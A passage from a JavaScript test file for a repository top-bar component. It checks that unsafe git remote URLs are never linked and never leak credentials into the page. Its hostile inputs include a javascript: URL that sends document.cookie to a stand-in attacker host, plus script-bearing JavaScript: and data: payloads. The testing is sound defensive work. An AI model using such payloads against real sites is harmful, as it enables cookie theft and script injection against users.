    assert.doesNotMatch(none, /<a\b/, "a repository with no remote must render no link");
    for (const unlinkable of [
      "git@github.com:generalbusiness-ai/gitseq.git",
      "ssh://git@github.com/generalbusiness-ai/gitseq.git",
      // git:// parses cleanly and carries no userinfo, so only the scheme
      // allowlist can refuse it.
      "git://github.com/generalbusiness-ai/gitseq.git",
      "file:///srv/git/gitseq.git",
      // A scheme nobody has enumerated, carrying an authority so that a
      // missing host is not what refuses it. An allowlist refuses this
      // because it is unlisted; a denylist of known-bad schemes admits it.
      "future+git://github.com/generalbusiness-ai/gitseq.git",
      "not a url at all",
    ]) {
      assert.equal(await topBarMarkup(vite, unlinkable), none, `${unlinkable} did not fall back to plain text`);
    }
  } finally {
    await vite.close();
  }
});

test("a script-bearing remote never reaches an href", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    for (const hostile of [
      "javascript:fetch('https://attacker.invalid?c='+document.cookie)",
      "JavaScript:alert(document.domain)",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ]) {
      const markup = await topBarMarkup(vite, hostile);
      assert.doesNotMatch(markup, /href=/, `${hostile} reached an href attribute`);
      assert.doesNotMatch(markup, /javascript:|data:|attacker\.invalid/i, `${hostile} reached the DOM`);
    }
  } finally {
    await vite.close();
  }
});

test("a remote carrying userinfo does not leak it into the DOM", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const markup = await topBarMarkup(vite, "https://x-access-token:s3cr3t-token@github.com/generalbusiness-ai/gitseq.git");
    assert.doesNotMatch(markup, /s3cr3t-token|x-access-token/, "a credential in the remote URL reached the DOM");
    assert.doesNotMatch(markup, /<a\b/, "a remote carrying userinfo is declined, not stripped and linked");
  } finally {
    await vite.close();
  }
});

// The same rule as userinfo, applied to the other two places a URL can carry a
// credential. Declining userinfo while passing a query through would be one
// rule applied to one syntax.
test("a remote carrying a query or fragment does not leak it into the DOM", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    for (const bearing of [
      "https://github.com/generalbusiness-ai/gitseq.git?access_token=s3cr3t-token",
      "https://github.com/generalbusiness-ai/gitseq.git#access_token=s3cr3t-token",
    ]) {
      const markup = await topBarMarkup(vite, bearing);
      assert.doesNotMatch(markup, /s3cr3t-token|access_token/, `${bearing} reached the DOM`);
      assert.doesNotMatch(markup, /<a\b/, `${bearing} was linked rather than declined`);
    }
  } finally {
    await vite.close();
  }
});
